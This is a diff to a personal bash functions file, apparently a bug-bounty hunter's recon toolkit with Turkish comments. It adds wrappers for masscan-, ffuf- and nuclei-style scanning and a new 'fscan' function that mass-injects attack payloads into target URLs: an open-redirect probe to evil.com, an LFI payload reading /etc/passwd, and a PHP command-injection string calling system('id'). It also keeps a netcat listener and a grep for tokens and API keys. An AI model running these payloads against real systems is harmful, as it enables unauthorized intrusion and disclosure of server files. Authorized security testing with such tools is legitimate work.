@@ -1,14 +1,24 @@
 #----- AWS -------
 
+c(){
+
+cd /mnt/c/Users/Akif/Desktop
+}
+
+d(){
+cd /mnt/c/Users/Akif/Download
+}
+
+
 LabInstallDedcrowd() {
 echo "[x] DedCrowd Lab is installing... "
 
-echo "	crtndstry is installing..."
+echo "  crtndstry is installing..."
 cd /opt; git clone https://github.com/nahamsec/crtndstry.git
 mkdir /work_table
 cd /opt ; git clone https://github.com/s0md3v/XSStrike.git
 cd XSStrike;  pip install -r requirements.txt --break-system-packages
-cd / 
+cd /
 go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
 go install github.com/bitquark/shortscan/cmd/shortscan@latest
 
@@ -20,7 +30,7 @@ aws s3 ls s3://$1
 }
 
 s3cp(){
-aws s3 cp $2 s3://$1 
+aws s3 cp $2 s3://$1
 }
 
 #---- Content discovery ----
@@ -46,7 +56,7 @@ mscan(){ #runs masscan
 sudo masscan -p4443,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,744
 }
 
-certspotter(){ 
+certspotter(){
 curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
 } #h/t Michiel Prins
 
@@ -64,7 +74,7 @@ curl http://ipinfo.io/$1
 
 #------ Tools ------
 dirsearch(){ runs dirsearch and takes host and extension as arguments
-dirsearch.py -u $1 -e $2 -t 50 -b 
+dirsearch.py -u $1 -e $2 -t 50 -b
 }
 
 
@@ -73,7 +83,7 @@ nc -l -n -vv -p $1 -k
 }
 
 crtshdirsearch(){ #gets all domains from crtsh, runs httprobe and then dir bruteforcers
-curl -s https://crt.sh/?q\=%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe -c 50 | grep https | xargs -n1 -I{} dirsearch -u {} -e $2 -t 50 -b 
+curl -s https://crt.sh/?q\=%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe -c 50 | grep https | xargs -n1 -I{} dirsearch -u {} -e $2 -t 50 -b
 }
 
 # ncx fonksiyonu
@@ -135,15 +145,15 @@ sqlf() {
 }
 
 ffr() {
-  ffuf -w /root/myWordlists/raft-medium-directories.txt -u "$1" -fs "$2" -t 230  
+  ffuf -w /root/myWordlists/raft-medium-directories.txt -u "$1" -fs "$2" -t 230
 }
 
 ffj() {
- ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u "$1" -fs "$2" -t 230  
+ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u "$1" -fs "$2" -t 230
 }
 
 ffa() {
- ffuf -w /karanxa/Bug-Bounty-Wordlists/all_fuzz.txt -u "$1" -fs "$2" -t 230  
+ ffuf -w /karanxa/Bug-Bounty-Wordlists/all_fuzz.txt -u "$1" -fs "$2" -t 230
 }
 
 fft() {
@@ -371,7 +381,7 @@ gfs() {
 atearn() {
     # Varsayılan çıktı dizini
     default_output_dir="$HOME/aTearn_output"
-    
+
     # Eğer -o parametresi yoksa varsayılan dizini kullan
     if [[ "$*" =~ "-o" ]]; then
         python3 /opt/aTearn/aTearn.py "$@"
@@ -395,6 +405,141 @@ natearn() {
 
 
 cnf() {
-	grep -Ei 'config|api|token|app_|yml|-key|api-key|user_|_id|_url|http'
+        grep -Ei 'config|api|token|app_|yml|-key|api-key|user_|_id|_url|http'
 
+}
+
+
+nucScan() {
+  local domain=""
+  local output_dir=""
+  local input_file=""
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -d)
+        domain="$2"
+        shift 2
+        ;;
+      -o)
+        output_dir="$2"
+        shift 2
+        ;;
+      *)
+        input_file="$1"
+        shift
+        ;;
+    esac
+  done
+
+  # Girdi kontrolü
+  if [[ -z "$domain" && -z "$input_file" ]]; then
+    echo "Kullanım: nucScan -d <domain> [-o <output_dir>] veya <domains.txt>"
+    return 1
+  fi
+
+  # Girdi dosyasını ayarla
+  if [[ -n "$domain" ]]; then
+    echo "$domain" > subdomains.txt
+  elif [[ -n "$input_file" ]]; then
+    cp "$input_file" subdomains.txt
+  fi
+
+  # Çıktı klasörünü ayarla
+  if [[ -z "$output_dir" ]]; then
+    output_dir="${domain}_nucScan"
+  fi
+
+  mkdir -p "$output_dir"
+
+  # 1. nuclei taraması
+  nuclei -u subdomains.txt -severity medium,high,critical -o "$output_dir/nuclei_output.txt"
+
+  # 2. uniq + anew + uro + httpx + nuclei
+  find . -type f -exec cat {} + 2>/dev/null | sort | uniq | anew | uro | httpx-toolkit -mc 200 | \
+  nuclei -t /nuclei-templates/ --severity medium,high,critical -o "$output_dir/phase2.txt"
+
+  # 3. LFI grep + httpx + nuclei
+  find . -type f -exec cat {} + 2>/dev/null | grep -Ei '(\?|&)(file|path|page|folder|doc|url)=' | \
+  httpx-toolkit -mc 200 | nuclei -t /nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30 -o "$output_dir/lfi.txt"
+
+  # 4. GAU + JS dosyaları + nuclei
+  cat subdomains.txt | gau | grep ".js" | httpx-toolkit -content-type | grep 'application/javascript' | \
+  awk '{print $1}' | nuclei -t /nuclei-templates/http/exposures/ -silent -o "$output_dir/secrets.txt"
+
+  # 5. Sadece JS linkleri
+  cat subdomains.txt | gau | grep '\.js$' | httpx-toolkit -status-code -mc 200 -content-type | grep 'application/javascript' \
+  > "$output_dir/js_files.txt"
+}
+
+fscan() {
+  local input_file=""
+  local domain=""
+  local output_dir=""
+  local threads=10  # Thread sayısı
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -d)
+        domain="$2"
+        shift 2
+        ;;
+      -o)
+        output_dir="$2"
+        shift 2
+        ;;
+      -t)
+        threads="$2"
+        shift 2
+        ;;
+      *)
+        input_file="$1"
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -n "$domain" ]]; then
+    echo "$domain" > fscan_input.txt
+  elif [[ -n "$input_file" ]]; then
+    cp "$input_file" fscan_input.txt
+  else
+    cat - > fscan_input.txt
+  fi
+
+  if [[ -z "$output_dir" ]]; then
+    output_dir="${domain:-fscan}_fscan"
+  fi
+  mkdir -p "$output_dir"
+
+  echo "[*] Redirect taraması başlıyor..."
+  cat fscan_input.txt | uro | uniq | grep -a -i "=http" | qsreplace "evil.com" | \
+    xargs -P "$threads" -I {} bash -c '
+      response=$(curl -s -L -I "{}" | grep "evil.com")
+      if [[ -n "$response" ]]; then
+        echo -e "{} \033[0;31mRedirect Vulnerable\033[0m"
+        echo "{} Redirect Vulnerable" >> "'"$output_dir"'/redirects.txt"
+        echo "$response" >> "'"$output_dir"'/redirects.txt"
+      fi
+    '
+
+  echo "[*] LFI taraması başlıyor..."
+  cat fscan_input.txt | qsreplace "111" | uro | sort | uniq | sed 's/111/\/etc\/passwd%00/' | \
+    xargs -P "$threads" -I {} bash -c '
+      curl -s "{}" | grep "root:x:" && {
+        echo "{} is vulnerable"
+        echo "{}" >> "'"$output_dir"'/lfi.txt"
+      }
+    '
+
+  echo "[*] Command Injection taraması başlıyor..."
+  cat fscan_input.txt | uro | grep "\?" | sed "s/=./='.system(%27id%27);/" | uniq | \
+    xargs -P "$threads" -I {} bash -c '
+      curl -s "{}" | grep -i "uid=" && {
+        echo "{} is vulnerable to Command Injection"
+        echo "{}" >> "'"$output_dir"'/command_injection.txt"
+      }
+    '
+
+  echo "[*] Taramalar tamamlandı. Çıktılar: $output_dir klasöründe."
 }
